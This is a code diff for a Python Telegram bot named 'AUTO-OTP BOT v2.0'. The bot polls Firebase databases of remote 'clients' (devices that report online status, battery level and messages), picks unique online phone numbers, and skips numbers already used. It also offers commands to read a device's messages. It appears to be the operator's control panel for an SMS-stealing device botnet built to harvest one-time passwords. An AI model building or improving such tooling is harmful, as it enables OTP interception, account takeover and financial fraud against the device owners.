@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.8                       ║
+║          AUTO-OTP BOT v2.0                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -315,7 +315,7 @@ def _looks_like_phone(s):
 def _phone_from_any(obj, depth=0):
     """Recursively look for a phone-looking value under known keys."""
     if depth > 4 or not isinstance(obj, dict): return None
-    # Direct keys first — `to` is what your DB uses
+    # Direct keys first
     for k in ("to","number","phone","phoneNumber","mobNo","mobile","num",
               "msisdn","contact","user","recipient","target","destination",
               "Phone","Mobile","PhoneNumber","MobNo"):
@@ -341,15 +341,15 @@ def _is_online(dd):
 
 
 def fb_scan():
-    """Scan all DBs and return ONLINE devices — ONE ROW PER UNIQUE PHONE.
+    """Scan all DBs. HARD-dedupe by phone (one row per unique number).
 
-    Two-stage:
-      1. Collect every online candidate into `raw`
-      2. Hard-dedupe by phone → keep best (freshest lastMessageTime, then highest battery)
+    The `seen` dict is keyed by phone string, so duplicates are
+    mathematically impossible to appear in the output.
     """
-    raw = []   # all online candidates
+    seen = {}   # phone -> best candidate info
 
     with firebase_lock: dbs = list(firebase_dbs)
+    logger.info(f"[SCAN] === scanning {len(dbs)} DB(s) ===")
 
     for db in dbs:
         url = db['url'].rstrip('/'); auth = db['auth']
@@ -358,83 +358,62 @@ def fb_scan():
         try:
             r = requests.get(f"{url}/clients.json?auth={auth}", timeout=12)
             clients = r.json() if r.status_code == 200 else None
-        except: clients = None
-        if not isinstance(clients, dict) or not clients: continue
+        except Exception as e:
+            logger.warning(f"[SCAN] clients fetch failed for {url}: {e}")
+            clients = None
+        if not isinstance(clients, dict) or not clients:
+            logger.warning(f"[SCAN] {url} -> no clients")
+            continue
 
-        # /commands (fallback phone source)
-        try:
-            r = requests.get(f"{url}/commands.json?auth={auth}", timeout=12)
-            commands = r.json() if r.status_code == 200 else {}
-        except: commands = {}
-        if not isinstance(commands, dict): commands = {}
-
-        # /sendSms (fallback phone source)
-        try:
-            r = requests.get(f"{url}/sendSms.json?auth={auth}", timeout=12)
-            sendsms = r.json() if r.status_code == 200 else {}
-        except: sendsms = {}
-        if not isinstance(sendsms, dict): sendsms = {}
-
-        logger.info(f"[SCAN] {url.split('//')[-1][:40]} clients={len(clients)} "
-                    f"commands={len(commands)} sendSms={len(sendsms)}")
+        online_count = 0
+        with_phone = 0
 
         for did, dd in clients.items():
             if not isinstance(dd, dict): continue
             if not _is_online(dd): continue
+            online_count += 1
 
-            # Phone lookup chain
             ph = _phone_from_any(dd)
-            if not ph and did in commands:
-                ph = _phone_from_any(commands[did])
-            if not ph and did in sendsms:
-                ph = _phone_from_any(sendsms[did])
             if not ph: continue
+            with_phone += 1
 
-            # Freshness score
             last_ts = 0
             for k in ("lastMessageTime","last_message_time","lastSeen","timestamp"):
                 v = dd.get(k)
                 if isinstance(v, (int, float)) and v > last_ts:
                     last_ts = int(v)
 
-            # Battery score
             batt_raw = str(dd.get("battery","")).replace("%","").strip()
             try: batt = int(batt_raw) if batt_raw else 0
             except: batt = 0
 
-            raw.append({
-                "db_url": url, "db_auth": auth,
-                "dev_id": did, "phone": ph, "phone_display": ph,
-                "battery": str(dd.get("battery","?"))[:6],
-                "last_ts": last_ts, "batt_int": batt,
-            })
+            prev = seen.get(ph)
+            if prev is None or (last_ts, batt) > (prev["last_ts"], prev["batt"]):
+                seen[ph] = {
+                    "db_url": url, "db_auth": auth,
+                    "dev_id": did, "phone": ph,
+                    "battery": str(dd.get("battery","?"))[:6],
+                    "last_ts": last_ts, "batt": batt,
+                }
 
-    logger.info(f"[SCAN] raw candidates: {len(raw)}")
+        logger.info(f"[SCAN] {url.split('//')[-1][:40]} online={online_count} with_phone={with_phone}")
 
-    # ---- HARD DEDUPE ----
-    best = {}   # phone -> candidate
-    for c in raw:
-        prev = best.get(c["phone"])
-        if prev is None:
-            best[c["phone"]] = c
-        elif (c["last_ts"], c["batt_int"]) > (prev["last_ts"], prev["batt_int"]):
-            best[c["phone"]] = c
-
-    logger.info(f"[SCAN] unique phones after dedupe: {len(best)}")
-
-    # Filter already-used numbers
+    # Build final list, filter used
     devs = []
     with used_lock:
-        for ph, c in best.items():
+        for ph, info in seen.items():
             if ph in used_numbers: continue
             devs.append({
-                "db_url": c["db_url"], "db_auth": c["db_auth"],
-                "dev_id": c["dev_id"], "phone": c["phone"],
-                "phone_display": c["phone_display"],
-                "battery": c["battery"],
+                "db_url": info["db_url"], "db_auth": info["db_auth"],
+                "dev_id": info["dev_id"], "phone": info["phone"],
+                "phone_display": info["phone"],
+                "battery": info["battery"],
             })
 
-    logger.info(f"[SCAN] returning {len(devs)} devices (after used-filter)")
+    logger.info(f"[SCAN] === unique online phones: {len(seen)} | after used-filter: {len(devs)} ===")
+    for ph, info in list(seen.items())[:10]:
+        logger.info(f"[SCAN]   {ph}  dev={info['dev_id'][:14]}  batt={info['battery']}")
+
     return devs
 
 
@@ -595,7 +574,7 @@ def handle(cid, text):
             f"  /removefire <code>URL</code> | all\n"
             f"  /listfire\n\n"
             f"📱 <b>Auto-OTP:</b>\n"
-            f"  /scan — Online devices\n"
+            f"  /scan — Online devices (unique)\n"
             f"  /debugscan — Inspect /clients + top keys\n"
             f"  /debugusers — Inspect user/phone paths\n"
             f"  /debugmsgs <code>&lt;deviceId&gt;</code> — Show messages\n"
@@ -725,21 +704,10 @@ def handle(cid, text):
                     data = r.json()
                     if isinstance(data, dict):
                         report.append(f"◈ keys under /clients: <b>{len(data)}</b>")
-                        for i, (did, dd) in enumerate(list(data.items())[:3], 1):
-                            if isinstance(dd, dict):
-                                fields = list(dd.keys())[:15]
-                                report.append(f"  {i}. <code>{did[:14]}</code>")
-                                report.append(f"     fields: {', '.join(fields)}")
-                                for k in fields:
-                                    kl = k.lower()
-                                    if any(x in kl for x in ['status','online','phone','mob','number','active','sim','contact']):
-                                        report.append(f"     ↳ {k} = <code>{str(dd.get(k))[:40]}</code>")
-                            else:
-                                report.append(f"  {i}. <code>{did[:14]}</code> = {str(dd)[:60]}")
+                        online = sum(1 for d in data.values() if _is_online(d))
+                        report.append(f"◈ status:true count: <b>{online}</b>")
                     elif isinstance(data, list):
                         report.append(f"◈ /clients is a LIST of {len(data)} items")
-                    else:
-                        report.append(f"◈ returned: {str(data)[:100]}")
                 else:
                     report.append(f"◈ body: <code>{r.text[:150]}</code>")
             except Exception as e:
